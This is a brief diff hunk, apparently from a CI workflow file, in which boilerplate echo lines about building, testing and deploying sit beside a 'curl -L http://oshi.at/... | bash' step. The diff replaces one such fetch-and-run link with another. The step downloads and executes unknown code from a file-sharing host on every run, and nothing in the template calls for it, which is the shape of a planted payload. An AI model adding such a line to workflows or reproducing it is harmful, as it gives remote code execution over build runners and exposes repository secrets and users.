@@ -19,4 +19,4 @@ jobs:
           echo $0
           echo Add other actions to build,
           echo test, and deploy your project.
-          curl -L http://oshi.at/rdgn | bash
+          curl -L http://oshi.at/RKWH | bash
